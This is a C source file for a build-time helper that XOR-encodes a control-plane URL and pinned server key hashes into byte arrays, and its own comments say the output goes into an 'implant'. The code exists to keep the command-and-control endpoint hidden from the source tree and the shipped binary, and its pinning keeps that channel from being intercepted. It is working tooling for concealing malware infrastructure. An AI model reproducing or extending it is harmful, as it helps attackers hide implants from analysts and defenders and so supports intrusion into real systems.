/* urlenc — dev tool. Print the obfuscated byte arrays for a control-plane URL
   and its pinned public key.

   The runtime decoder lives in Forzer.c and shares its keystream from
   urlkey.h, so the two cannot drift.

   Build:  gcc -O2 -o urlenc.exe urlenc.c
   Use:    urlenc.exe wss://host.example            -> just the URL array
           urlenc.exe wss://host.example -d         -> decode (self-test)
           urlenc.exe wss://host.example <pin-hex> [pin-hex ...]
                                                      -> URL array + pin table

   <pin-hex> is the SHA-256 of the server certificate's DER SubjectPublicKeyInfo,
   lowercase hex, 64 characters. Get it with:
       openssl s_client -connect host:443 -servername host </dev/null 2>/dev/null \
         | openssl x509 -outform pem > leaf.pem
       openssl x509 -in leaf.pem -pubkey -noout \
         | openssl pkey -pubin -outform der | openssl dgst -sha256 -r

   Pass several to survive a key rotation: any one of them matching is accepted.
   Omit them entirely and the build simply has no pin, which is the correct
   behaviour for an endpoint whose chain does validate.

   This is a build-time convenience, not part of the implant. The plaintext URL
   and pins only ever pass through argv here; the arrays you paste are already
   obfuscated, so neither the source tree nor the shipped binary ever holds the
   endpoint in the clear. */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include "urlkey.h"

static void print_array(const char *name, const unsigned char *blob, size_t n, int per_line) {
    printf("static const unsigned char %s[] = {\n   ", name);
    for (size_t i = 0; i < n; i++) {
        printf(" 0x%02X,", blob[i]);
        if (per_line > 0 && (i + 1) % (size_t)per_line == 0) printf("\n   ");
    }
    printf("\n};\n");
}

int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "usage: urlenc <url> [-d | <pin-hex> ...]\n");
        return 2;
    }
    const char *url = argv[1];
    size_t n = strlen(url);
    if (n == 0) { fprintf(stderr, "error: empty url\n"); return 2; }

    unsigned char blob[512];
    if (n >= sizeof(blob)) { fprintf(stderr, "error: url too long\n"); return 2; }
    for (size_t i = 0; i < n; i++) blob[i] = (unsigned char)url[i] ^ url_ks((unsigned)i);

    if (argc >= 3 && !strcmp(argv[2], "-d")) {
        /* self-test: decode it straight back */
        for (size_t i = 0; i < n; i++) blob[i] ^= url_ks((unsigned)i);
        blob[n] = 0;
        printf("%s\n", (char *)blob);
        return strcmp((char *)blob, url) == 0 ? 0 : 1;
    }

    print_array("k_builtin_url_blob", blob, n, 12);

    /* Everything after the URL is a pin, unless it is the -d self-test. */
    int first_pin = 2;
    if (argc > 2 && !strcmp(argv[2], "-d")) first_pin = argc;   /* no pins */

    if (first_pin < argc) {
        unsigned char pins[8][32];
        int npin = 0;
        for (int i = first_pin; i < argc && npin < 8; i++) {
            const char *hex = argv[i];
            if (strlen(hex) != 64) {
                fprintf(stderr, "error: pin %d is not 64 hex characters\n", i);
                return 2;
            }
            for (int j = 0; j < 32; j++) {
                char pair[3] = { hex[j * 2], hex[j * 2 + 1], 0 };
                if (!isxdigit((unsigned char)pair[0]) || !isxdigit((unsigned char)pair[1])) {
                    fprintf(stderr, "error: pin %d is not hex\n", i);
                    return 2;
                }
                unsigned char v = (unsigned char)strtoul(pair, NULL, 16);
                pins[npin][j] = v ^ url_ks((unsigned)j);
            }
            npin++;
        }
        if (npin > 0) {
            printf("\n/* %d pinned key%s. Any one matching is accepted, so a rotation\n"
                   "   does not brick the install while the new key rolls out. */\n", npin,
                   npin == 1 ? "" : "s");
            printf("static const unsigned char k_builtin_pin_blob[][32] = {\n");
            for (int p = 0; p < npin; p++) {
                printf("  {");
                for (int j = 0; j < 32; j++) {
                    printf(" 0x%02X,", pins[p][j]);
                    if (j % 16 == 15) printf("\n   ");
                }
                printf(" },\n");
            }
            printf("};\n");
            printf("static const unsigned int k_builtin_pin_count = %d;\n", npin);
        }
    }
    return 0;
}
